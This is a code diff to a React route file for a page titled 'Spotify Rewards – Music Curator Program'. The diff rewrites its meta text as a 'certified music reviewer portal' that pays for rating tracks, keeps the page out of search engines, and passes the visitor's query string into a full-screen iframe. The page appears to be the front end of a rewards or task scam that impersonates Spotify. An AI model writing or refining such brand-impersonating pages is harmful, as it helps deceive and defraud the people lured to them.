@@ -1,22 +1,31 @@
 import { createFileRoute } from "@tanstack/react-router";
+import { useEffect, useState } from "react";
 
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
-      { title: "Spotify Rewards – Evaluate & Earn" },
-      { name: "description", content: "Avalie músicas e ganhe recompensas." },
+      { title: "Spotify Rewards – Music Curator Program" },
+      { name: "description", content: "Certified music reviewer portal. Rate tracks and earn rewards." },
       { name: "robots", content: "noindex, nofollow" },
-      { property: "og:title", content: "Spotify Rewards – Evaluate & Earn" },
-      { property: "og:description", content: "Avalie músicas e ganhe recompensas." },
+      { property: "og:title", content: "Spotify Rewards – Music Curator Program" },
+      { property: "og:description", content: "Certified music reviewer portal. Rate tracks and earn rewards." },
     ],
   }),
   component: Index,
 });
 
 function Index() {
+  const [iframeSrc, setIframeSrc] = useState("/sp/app/app.html");
+
+  useEffect(() => {
+    if (typeof window !== "undefined") {
+      setIframeSrc(`/sp/app/app.html${window.location.search}`);
+    }
+  }, []);
+
   return (
     <iframe
-      src="/sp/app/app.html"
+      src={iframeSrc}
       title="Spotify Rewards"
       style={{
         position: "fixed",
